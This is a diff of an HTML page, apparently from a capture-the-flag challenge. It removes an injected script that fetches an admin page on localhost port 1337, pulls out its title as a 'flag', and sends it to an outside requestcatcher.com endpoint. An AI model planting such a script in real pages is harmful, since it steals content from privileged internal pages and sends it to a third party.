@@ -6,40 +6,6 @@
 <body>
   <h1>This is a heading</h1>
   <p>This is a paragraph.</p>
-  <h4>flagtest</h4>
-<script>
-function getData(url) {
-    const xhr = new XMLHttpRequest();
-    xhr.open('GET', url, true);
-    
-    xhr.onload = function() {
-        if (xhr.status === 200) {
-            const data = JSON.parse(xhr.responseText);
-            console.log('Success:', data);
-        }
-    };
-    
-    xhr.onerror = function() {
-        console.error('Request failed');
-    };
-    
-    xhr.send();
-}
-
-async function getRealData() {
-  const AdminUrl = "http://127.0.0.1:1337/";
-  const testurl = "https://m1ra1b0t.github.io/";
-  const response =  await fetch(AdminUrl);
-  const adminHtml = await response.text();
-  const flag = adminHtml.match('<title>.*<\/title>');
-  const adminHtmlEncoded = encodeURIComponent(flag);
-  // Usage example
-  fetch("https://wecando.requestcatcher.com/adminhtml/" + adminHtmlEncoded);
-}
-//getData('https://wecando.requestcatcher.com/data');
-getRealData();
-
-</script>
 </body>
  
 </html> 
